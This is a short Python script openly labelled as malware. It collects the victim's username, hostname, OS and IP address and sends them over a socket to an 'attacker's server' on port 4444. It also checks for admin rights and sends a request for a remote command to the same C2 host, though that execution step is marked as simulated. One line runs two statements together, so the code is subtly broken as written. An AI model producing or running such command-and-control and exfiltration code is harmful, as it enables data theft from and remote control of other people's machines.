import socket
import subprocess
import platform
import os

# Configuration
C2_SERVER = "192.168.1.1" # The attacker's server
C2_PORT = 4444
COMMANDS = [] # Commands to run after connecting

def get_system_info():
    """Gathers basic system information."""
    info = {
        "username": os.getenv("USERNAME"),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "processor": platform.processor()
    }
    return info

def try_elevate():
    """Attempts to run the script as Administrator (Windows) or Root (Linux)."""
    print("[*] Attempting privilege escalation...")
    try:
        # Simple check for Windows Admin
        result = subprocess.run(["net", "session"], capture_output=True, timeout=5)
        if "System" in result.stdout.decode():
            print("[+] Privilege escalation successful (simulated).")
            return True
        else:
            print("[-] Running as standard user.")
            return False
    except Exception as e:
        print(f"[-] Error during escalation: {e}")
        return False

def exfiltrate_data(target):
    """Sends data to the C2 server."""
    info = get_system_info()
    payload = f"OS: {info['os']} | User: {info['username']} | IP: {info['ip_address']}"
    
    # Create a socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, C2_PORT))
    
    print(f"[+] Connecting to C2 server {target}...")
    s.send(payload.encode())
    print(f"[+] Sent: {payload}")
    
    s.close()

def fetch_and_run_payload():
    """Simulates downloading and running a remote command."""
    print("[*] Requesting remote command from C2...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((C2_SERVER, C2_PORT))
    
    # Send request to C2
    s.send(b"GET /payload?cmd=dir HTTP/1.1\r\nHost: C2\r\n\r\n")
    
    print("[+] Payload received (simulated).")
    print("In a real scenario, the script would save the response and execute it.")
    
    s.close()

def main():
    print("=== Malware Initialization ===")
    
    # 1. Try to get Admin rights
    if try_elevate():
        print("[*] Admin rights confirmed.")
    else:
        print("[*] Running with limited rights.")

    # 2. Steal and send info
    exfiltrate_data(C2_SERVER)

    # 3. Wait for command
    print("[*] Listening for C2 command...")
    fetch_and_run_payload()

    print("[*] Malware cycle complete.")

if __name__ == "__main__":
    main()
